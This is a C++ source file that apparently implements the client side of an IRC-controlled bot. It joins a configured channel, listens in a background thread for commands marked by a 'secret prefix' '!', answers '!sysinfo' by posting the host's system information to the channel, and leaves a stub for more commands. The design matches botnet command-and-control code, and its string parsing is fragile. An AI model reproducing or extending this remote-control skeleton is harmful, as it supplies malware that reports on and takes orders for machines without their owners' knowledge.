/*
 * IRCManager.cpp
 *
 *  Created on: May 13, 2012
 *      Author: mbreedlove
 */

#include "IRCManager.h"

IRCManager::IRCManager() {
	ircc = new IRCClient(CONFIG_IRC_SERVER, CONFIG_IRC_PORT);
	connected = false;
	hThread = 0;
}

IRCManager::~IRCManager() {
	delete ircc;
}

bool IRCManager::isConnected() {
	return connected;
}

void IRCManager::start() {
	connected = ircc->connect();
	if(!connected) {
		return;
	}
	hThread = this->startThread();
	
	ircc->joinChannel(CONFIG_IRC_CHANNEL);
	
	// Test connection
	ircc->sendMessage(CONFIG_IRC_CHANNEL, "testmessage");
}

void IRCManager::stop() {
	connected = false;
	CloseHandle(hThread);
	ircc->disconnect();
}

HANDLE IRCManager::startThread() {
	HANDLE hThread;
	hThread = (HANDLE)_beginthread(monitor, 0, this);
	return hThread;
}

void monitor(void* i) {
	IRCClient* ircc = (IRCClient*)((IRCManager*)i)->ircc;
	std::string data;
	data = ircc->readRaw();
	ircc->setServerName(data.substr(1, data.find_first_of(" ") -1));

	while(true) {
		data = ircc->readRaw();
		if(data.empty()) {
			((IRCManager*)i)->stop();
			return;
		}
		std::cout << data;
		fflush(stdout);

		// Handle data
		parseData(ircc, data);
	}
}

void parseData(IRCClient* ircc, std::string data) {
	// Secret prefix for commands

	std::string command;
	std::string args;
	unsigned int stop = data.find_last_of(":");
	unsigned int size = data.size();
	command = data.substr(stop +1, size -2);
	command = command.substr(0, command.size() -2);
	
	if(command.at(0) != '!')
		return;

	// Remove special char
	command = command.substr(1, command.size() -1);

	if(command.compare("sysinfo") == 0) {
		OSInfo* osi = new OSInfo();
		ircc->sendMessage(CONFIG_IRC_CHANNEL, osi->sysInfoStr());
		return;
	}
	/*
	Add more commands here
	*/

	return;
}
